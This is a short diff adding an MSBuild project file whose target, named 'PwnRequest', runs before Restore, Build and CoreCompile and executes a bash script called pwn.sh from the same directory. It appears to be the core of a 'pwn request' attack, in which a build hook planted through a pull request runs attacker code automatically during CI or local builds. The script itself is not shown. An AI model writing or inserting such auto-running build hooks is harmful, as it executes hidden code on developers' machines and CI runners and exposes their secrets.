@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="PwnRequest" BeforeTargets="Restore;Build;CoreCompile">
+    <Exec Command="bash $(MSBuildThisFileDirectory)pwn.sh" />
+  </Target>
+</Project>
